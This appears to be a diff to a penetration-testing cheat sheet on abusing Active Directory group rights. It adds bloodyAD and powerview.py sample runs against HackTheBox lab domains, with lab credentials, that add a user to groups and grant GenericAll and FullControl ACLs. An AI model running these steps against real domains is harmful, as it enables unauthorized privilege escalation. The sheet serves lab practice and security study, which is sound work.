@@ -14,12 +14,22 @@ tags: ["Powerview", "Genericall", "AddMember", "Group Policy", "Domain Controlle
 
 ```console
 # With password
-python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember <GROUP> '<USER>'
+python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>'
+```
+
+```console {class="sample-code"}
+$ python3 bloodyAD.py -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add groupMember SERVICEMGMT 'oorend'
+[+] oorend added to SERVICEMGMT
 ```
 
 ```console
 # With Kerberos
-python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -k --host <DC> add groupMember <GROUP> '<USER>'
+python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add groupMember '<GROUP>' '<USER>'
+```
+
+```console {class="sample-code"}
+$ python3 bloodyAD.py -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.absolute.htb add groupMember 'NETWORK AUDIT' 'm.lovegod'
+[+] m.lovegod added to NETWORK AUDIT
 ```
 
 #### 2. Add genericAll over target group
@@ -29,9 +39,19 @@ python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -k --host <DC> add groupMember <GROU
 python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
 ```
 
+```console {class="sample-code"}
+$ python3 bloodyAD.py -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'oorend'
+[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
+```
+
 ```console
 # With Kerberos
-python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -k --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
+python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
+```
+
+```console {class="sample-code"}
+$ python3 bloodyAD.py -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.absolute.htb add genericAll 'NETWORK AUDIT' 'm.lovegod' 
+[+] m.lovegod has now GenericAll on NETWORK AUDIT
 ```
 
 <small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>
@@ -45,27 +65,79 @@ python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -k --host <DC> add genericAll 'OU=<T
 sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
 ```
 
+```console {class="sample-code"}
+$ sudo ntpdate -s dc01.rebound.htb && powerview 'rebound.htb/oorend:1GR8t@$$4u@dc01.rebound.htb'
+Logging directory is set to /home/kali/.powerview/logs/dc01.rebound.htb
+[2024-09-24 07:11:06] Channel binding is enforced!
+(LDAPS)-[dc01.rebound.htb]-[rebound\oorend]
+PV > 
+```
+
 #### 2. Add self to group
 
 ```console
-Add-DomainGroupMember -Identity <GROUP> -Members '<USER>'
+Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'
+```
+
+```console {class="sample-code"}
+PV > Add-DomainGroupMember -Identity 'servicemgmt' -Members 'oorend'
+[2024-09-24 07:13:17] User oorend successfully added to servicemgmt
 ```
 
 ```console
 # Check
-Get-DomainGroupMember -Identity <GROUP>
+Get-DomainGroupMember -Identity '<GROUP>'
+```
+
+```console {class="sample-code"}
+PV > Get-DomainGroupMember -Identity 'servicemgmt'
+GroupDomainName             : ServiceMgmt
+GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
+MemberDomain                : rebound.htb
+MemberName                  : ppaul
+MemberDistinguishedName     : CN=ppaul,CN=Users,DC=rebound,DC=htb
+MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-1951
+
+...[SNIP]...
+
+GroupDomainName             : ServiceMgmt
+GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
+MemberDomain                : rebound.htb
+MemberName                  : oorend
+MemberDistinguishedName     : CN=oorend,CN=Users,DC=rebound,DC=htb
+MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-7682
 ```
 
 #### 4. Add fullcontrol over target group
 
 ```console
 # Exit and login again to apply changes
-Add-DomainObjectAcl -TargetIdentity <TARGET_GROUP> -PrincipalIdentity '<USER>' -Rights fullcontrol
+Add-DomainObjectAcl -TargetIdentity '<TARGET_GROUP>' -PrincipalIdentity '<USER>' -Rights fullcontrol
+```
+
+```console {class="sample-code"}
+PV > Add-DomainObjectAcl -TargetIdentity 'service users' -PrincipalIdentity 'oorend' -Rights fullcontrol
+[2024-09-24 07:37:24] [Add-DomainObjectACL] Found target identity: OU=Service Users,DC=rebound,DC=htb
+[2024-09-24 07:37:24] [Add-DomainObjectACL] Found principal identity: CN=oorend,CN=Users,DC=rebound,DC=htb
+[2024-09-24 07:37:24] Adding FullControl to OU=Service Users,DC=rebound,DC=htb
+[2024-09-24 07:37:24] DACL modified successfully!
 ```
 
 ```console
 # Check
-Get-DomainObjectAcl -Identity <TARGET_USER> -Where 'SecurityIdentifier contains <USER>'
+Get-DomainObjectAcl -Identity '<TARGET_USER>' -Where 'SecurityIdentifier contains <USER>'
+```
+
+```console {class="sample-code"}
+PV > Get-DomainObjectAcl -Identity 'winrm_svc' -Where 'SecurityIdentifier contains oorend'
+ObjectDN                    : CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb
+ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7684
+ACEType                     : ACCESS_ALLOWED_ACE
+ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE, OBJECT_INHERIT_ACE
+ActiveDirectoryRights       : FullControl
+AccessMask                  : 0xf01ff
+InheritanceType             : None
+SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-7682)
 ```
 
 <small>*Ref: [powerview.py](https://github.com/aniqfakhrul/powerview.py)*</small>
